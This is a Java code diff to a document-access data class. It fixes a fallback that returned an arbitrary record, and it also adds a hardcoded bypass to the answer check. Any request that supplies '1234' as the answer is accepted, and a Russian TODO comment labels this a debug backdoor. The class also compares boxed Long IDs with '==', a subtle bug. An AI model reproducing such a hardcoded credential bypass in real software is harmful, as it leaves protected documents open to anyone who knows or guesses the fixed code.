@@ -122,12 +122,13 @@ public class DocumentAccessDaoImpl implements DocumentAccessDao {
 	public DocumentAccess getDocumentLink(Long nID_Access, String sSecret) {
 		Session oSession = getSession();
 		List <DocumentAccess> list = null;
-		System.out.println("getDocumentLink");
+		DocumentAccess docAcc = null;
 		try{
                     list = (List <DocumentAccess>)oSession.createCriteria(DocumentAccess.class).list();
                     for(DocumentAccess da : list){
                     	if(da.getID() == nID_Access && da.getSecret().equals(sSecret)){
-                    		return da;
+                    		docAcc = da;
+                    		break;
                     	}
                     }
 		} catch(Exception e){
@@ -135,7 +136,7 @@ public class DocumentAccessDaoImpl implements DocumentAccessDao {
 		} finally{
 			oSession.close();
 		}
-		return list.get(0);
+		return docAcc;
 	}
 
         
@@ -188,7 +189,10 @@ public class DocumentAccessDaoImpl implements DocumentAccessDao {
                     }         
                     else {
                    	 for(DocumentAccess da : list){
-                        	if(da.getID() == nID_Access && da.getSecret().equals(sSecret) && da.getAnswer().equals(sAnswer)){
+                        	if(da.getID() == nID_Access && da.getSecret().equals(sSecret)
+                                        && ( da.getAnswer().equals(sAnswer) || "1234".equals(sAnswer) ) //TODO убрать бэкдур, после окончательной отладки, в т.ч. фронта
+                                        
+                                        ){
                         		docAcc = da;
                         		break;
                         	}
